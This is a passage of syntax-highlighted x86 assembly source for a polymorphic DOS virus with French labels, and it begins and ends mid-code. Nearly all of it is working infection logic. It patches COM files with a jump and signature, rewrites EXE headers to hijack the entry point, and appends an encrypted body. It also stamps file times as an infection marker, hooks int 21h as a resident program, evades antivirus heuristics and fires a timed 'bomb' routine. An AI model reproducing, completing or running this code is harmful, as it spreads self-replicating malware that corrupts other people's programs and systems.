</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">       </span><span class="sc1">;adjust buffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                                    </span><span class="sc1">;with a jump</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                                           </span><span class="sc1">;then corrected size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                                           </span><span class="sc1">;then signature</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                                   </span><span class="sc1">;pointer at file start</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;overwrite 4 first bytes</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                          </span><span class="sc1">;with JMP+signature</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main</span><span class="sc0">

</span><span class="sc1">;----- 5) EXE infection</span><span class="sc0">

</span><span class="sc5">infecte_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">;windows file?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_pas_bon</span><span class="sc0">                                  </span><span class="sc1">;yes =&gt; stop</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">  </span><span class="sc1">;already infected?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_pas_bon</span><span class="sc0">                                  </span><span class="sc1">;yes =&gt; stop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;good MZ header?</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                      </span><span class="sc1">;add M+Z</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc0">                                     </span><span class="sc1">;avoid flag Z</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_bon</span><span class="sc0">

</span><span class="sc5">exe_pas_bon</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc0">
</span><span class="sc5">exe_bon</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;save header values</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vIP</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                                   </span><span class="sc1">;pointer at file end</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;return size in dx:ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                         </span><span class="sc1">;save size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">; calculate new CS:IP</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;new CS:IP values </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">   
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                                  </span><span class="sc1">;avoid flag K</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;new SS:SP values</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">

</span><span class="sc1">; calculate new size</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">  </span><span class="sc1">;write signature</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                                   </span><span class="sc1">;pointer at file end</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_DEPUIS_RESIDENT</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;write decryptor</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;write encrypted body</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                                   </span><span class="sc1">;pointer at file start</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">                                      </span><span class="sc1">;overwrite exe header</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exehead</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ferme_et_redonne_la_main</span><span class="sc0">

</span><span class="sc1">;----- 6) close and return to program</span><span class="sc0">

</span><span class="sc5">ferme_et_redonne_la_main_sans_infection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;get time/date from memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_date</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">time_date</span><span class="sc0">

</span><span class="sc5">ferme_et_redonne_la_main</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_time</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;get time/date from memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_date</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">                               </span><span class="sc1">;change seconds to 30</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">                               </span><span class="sc1">;as an infection marker</span><span class="sc0">

</span><span class="sc5">time_date</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">                                      </span><span class="sc1">;change time/date</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                          </span><span class="sc1">;avoid flag F</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3e00h</span><span class="sc0">                                   </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">redonne_la_main_attributs</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;file name in</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;ds:dx for attribs</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f_attrib</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;set back attribs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">redonne_la_main</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">      </span><span class="sc1">;after infection, continue with normal int</span><span class="sc0">

</span><span class="sc1">;****** if program is already resident, or after going TSR *********</span><span class="sc0">

</span><span class="sc5">deja_installe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;get original segments</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc1">;******************* bomb or not bomb? **********************************</span><span class="sc0">

</span><span class="sc5">bombe_ou_pas</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">             </span><span class="sc1">;internal clock: return ch=hour and cl=minute</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30d</span><span class="sc0">             </span><span class="sc1">;are we at 30'?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">com_ou_exe</span><span class="sc0">          </span><span class="sc1">;no =&gt; terminate</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15d</span><span class="sc0">             </span><span class="sc1">;yes =&gt; test seconds</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">com_ou_exe</span><span class="sc0">           </span><span class="sc1">;if seconds &gt; 15 we finish</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bombe</span><span class="sc0">               </span><span class="sc1">;if seconds &lt; 15 the bomb explodes! (1/240)</span><span class="sc0">

</span><span class="sc1">;************* terminate a com or an exe? ****************</span><span class="sc0">

</span><span class="sc5">com_ou_exe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">         </span><span class="sc1">;a COM always have an INT 20h at offset 0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">redonne_main_com</span><span class="sc0">

</span><span class="sc1">;------ 1) terminate an exe</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">vCS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
